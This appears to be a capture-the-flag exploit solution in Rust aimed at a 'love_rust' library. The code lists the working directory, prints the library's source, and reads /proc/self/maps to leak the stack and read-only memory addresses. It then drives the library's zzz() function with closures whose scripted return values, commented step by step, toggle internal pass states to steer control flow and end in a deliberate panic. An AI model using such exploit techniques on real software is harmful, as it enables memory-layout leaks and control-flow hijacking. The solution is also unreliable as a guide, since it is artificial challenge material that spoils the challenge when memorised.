

// SOLUTION START
use love_rust::*;
use std::sync::{Mutex, OnceLock};
use std::io::{self, BufRead, BufReader, Result};

use std::fs;
use std::path::Path;

static F3_RESULT: OnceLock<Mutex<u128>> = OnceLock::new();
static TURN1: OnceLock<Mutex<u128>> = OnceLock::new();
static TURN2: OnceLock<Mutex<u128>> = OnceLock::new();

fn get_f3_result() -> &'static Mutex<u128> {
    F3_RESULT.get_or_init(|| Mutex::new(0))
}

fn get_turn1() -> &'static Mutex<u128> {
    TURN1.get_or_init(|| Mutex::new(0))
}

fn get_turn2() -> &'static Mutex<u128> {
    TURN2.get_or_init(|| Mutex::new(0))
}

/// Checks if a number is prime
#[inline(always)]
fn p(n: u128) -> bool {
    if n < 2 {
        return false;
    }
    if n == 2 || n == 3 {
        return true;
    }
    if n % 2 == 0 || n % 3 == 0 {
        return false;
    }
    let mut i = 5;
    while i * i <= n {
        if n % i == 0 || n % (i + 2) == 0 {
            return false;
        }
        i += 6;
    }
    true
}

// #[inline(always)]
// fn sum_digits(n: u128) -> u128 {
//     n.to_string()
//         .chars()
//         .map(|c| c.to_digit(10).unwrap() as u128)
//         .sum()
// }

// fn mul_digits(n: u128) -> u128 {
//     n.to_string()
//         .chars()
//         .map(|c| c.to_digit(10).unwrap() as u128)
//         .product()
// }

fn pow_digits(n: u128) -> u128 {
    let digits: Vec<u128> = n.to_string()
        .chars()
        .map(|c| c.to_digit(10).unwrap() as u128)
        .collect();

    let mut result: u128 = 1;

    for (i, &d) in digits.iter().enumerate() {
        let next_digit = digits.get(i + 1).copied().unwrap_or(1); // Default to 1 for the last digit
        let powered = d.wrapping_pow(next_digit as u32);
        result = result.wrapping_mul(powered);
    }

    result
}


fn read_u32_or_default() -> u32 {
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap_or(0);
    input.trim().parse().unwrap_or(0)
}


fn visit_dirs(dir: &Path) -> io::Result<()> {
    if dir.is_dir() {
        for entry in fs::read_dir(dir)? {
            let entry = entry?;
            let path = entry.path();
            println!("{}", path.display());
            if path.is_dir() {
                visit_dirs(&path)?;
            }
        }
    }
    Ok(())
}


fn main() {


    let path = Path::new(".");
    if let Err(e) = visit_dirs(&path) {
        println!("Error: {}", e);
    }
    let contents = fs::read_to_string("src/lib.rs").expect("Unable to read file");
    println!("{}", contents);

    let mut correct_tuples: [(u32, u32); 16] = [
        (0,10), (0,10), (0,10), (0,10), (0,10), (0,10), (0,10), (0,10), (0,10), (0,10), (0,10), (0,10), (0,10), (0,10), (0,10), (0,10)
    ];
    let mut stack_start_address: u64 = 0;
    let mut ronly_start_address: u64 = 0;

    let path = "/proc/self/maps";
    let file = fs::File::open(path);

    let file = match file {
        Ok(file) => file,
        Err(e) => {
            eprintln!("Failed to open file: {}", e);
            return;  // Exit the function if the file cannot be opened
        }
    };

    let reader = BufReader::new(file);
    let mut prev_line = String::new();
    let mut cc = 0;

    for line in reader.lines() {
        let line = match line {
            Ok(line) => line,
            Err(e) => {
                eprintln!("Failed to read line: {}", e);
                continue;  // Continue to the next line in case of an error
            }
        };

        if line.contains("r--") {
            cc+=1;
            if cc==2{
                println!("found: {}", line);
                let address_range = line.split_whitespace().next().unwrap_or("");
                // Extract the starting address (before the dash '-')
                let start_addr_str = address_range.split('-').next().unwrap_or("");
                // Parse the hexadecimal string into a u64
                match u64::from_str_radix(start_addr_str, 16) {
                    Ok(addr) => {
                        ronly_start_address = addr;
                    }
                    Err(e) => {
                        eprintln!("Failed to parse address '{}': {}", start_addr_str, e);
                        return;
                    }
                }
            }
        } else if line.contains("[stack]") {
            // Extract the address range (first field)
            let address_range = line.split_whitespace().next().unwrap_or("");
            // Extract the starting address (before the dash '-')
            let start_addr_str = address_range.split('-').next().unwrap_or("");
            // Parse the hexadecimal string into a u64
            match u64::from_str_radix(start_addr_str, 16) {
                Ok(addr) => {
                    stack_start_address = addr;
                }
                Err(e) => {
                    eprintln!("Failed to parse address '{}': {}", start_addr_str, e);
                    return;
                }
            }
            break;  // Stop after finding the stack
        }
        prev_line = line.clone();
    }
    println!("{:} RONLY/: {:#x}", 777, ronly_start_address);


    let n1 = read_u32_or_default();
    let n2 = read_u32_or_default();
    for i in 0..16{
        correct_tuples[i] = (n1,n2+ (i as u32)*16);
    }


    // closure1 iterates and subtracts the results from closure2
    let closure1 = |vec: Vec<u128>, f2: fn(u128, fn(u128) -> u128) -> u128| -> u128 {
        let res: u128 = vec.into_iter()
            .map(|x| f2(x, pow_digits))
            .fold(0, |acc, x| acc.wrapping_add(x));
        *get_f3_result().lock().unwrap() = res;
        println!("{:?}", res);
        res
    };

    // closure2 calls closure3 for prime numbers
    let closure2 = |x: u128, f3: fn(u128) -> u128| -> u128 {
        if p(x) {
            f3(x)
        } else {
            0
        }
    };

    let closure3 = |_x: u128| -> u128 {
        let mut turn = get_turn1().lock().unwrap();
        let ret = match *turn {
            _ => {1},
        };
        ret
    };

    zzz(closure1, closure2, closure3, &correct_tuples);

    let closure3 = |_x: u128| -> u128 {
        let mut turn = get_turn2().lock().unwrap();
        let ret = match *turn {
            0 => { 
                // Set pass1
                // (0,0,0) -> (1,0,0)
                *turn += 1;
                6553
            },
            1 => { 
                // Avoid resetting pass1
                // (1,0,0) -> (1,0,0)
                *turn += 1;
                11
            },
            2 => { 
                // Set pass2
                // (1,0,0) -> (1,1,0)
                *turn += 1;
                9_999_991
            },
            3 => {
                // Reset pass1 to avoid resetting pass2
                // (1,1,0) -> (0,1,0)
                *turn += 1;
                6553
            },
            4 => { 
                // Avoid setting pass1 to avoid ressetting pass2
                // (0,1,0) -> (0,1,0)
                *turn += 1;
                11
            },
            5 => { 
                // Set pass3
                // (0,1,0) -> (0,1,1)
                *turn += 1;
                225376403041027292691343580678468593449
            },
            6 => { 
                // Set pass1 to reset pass2
                // (0,1,1) -> (1,1,1)
                *turn += 1;
                6553
            },
            7 => {
                // Avoid reseting pass1 to reset pass2
                // (1,1,1) -> (1,1,1)
                *turn += 1;
                11
            },
            8 => { 
                // Reset pass2
                // (1,1,1) -> (1,0,1)
                *turn += 1;
                9_999_991
            },
            9 => { 
                // Reset pass1 to avoid seting pass2
                // (1,0,1) -> (0,0,1)
                *turn += 1;
                6553
            },
            10 => {
                // Avoid resetting pass1 to drive control to pass3 clause
                // (0,0,1) -> (0,1,1)
                *turn += 1;
                11
            },
            11 => { // Set globals
                *turn += 1;
                999331
            },
            _ => {1},
        };
        ret
    };

    zzz(closure1, closure2, closure3, &correct_tuples);

    let closure3 = |_x: u128| -> u128 {
        let mut turn = get_turn2().lock().unwrap();
        let ret = match *turn {
            0 => {
                *turn += 1;
                6553
            },
            1 => {
                *turn += 1;
                11
            },
            2 => {
                *turn += 1;
                9_999_991
            },
            3 => {
                *turn += 1;
                6553
            },
            4 => {
                *turn += 1;
                11
            },
            5 => {
                *turn += 1;
                999331
            },
            _ => {
                std::panic::panic_any(*get_f3_result().lock().unwrap())
            },
        };
        ret
    };
    let closure1 = |vec: Vec<u128>, f2: fn(u128, fn(u128) -> u128) -> u128| -> u128 {
        let res: u128 = vec.into_iter()
            .map(|x| f2(x, pow_digits))
            .fold(0, |acc, x| acc.wrapping_add(x));
        res
    };



    zzz(closure1, closure2, closure3, &correct_tuples);
}
// SOLUTION END




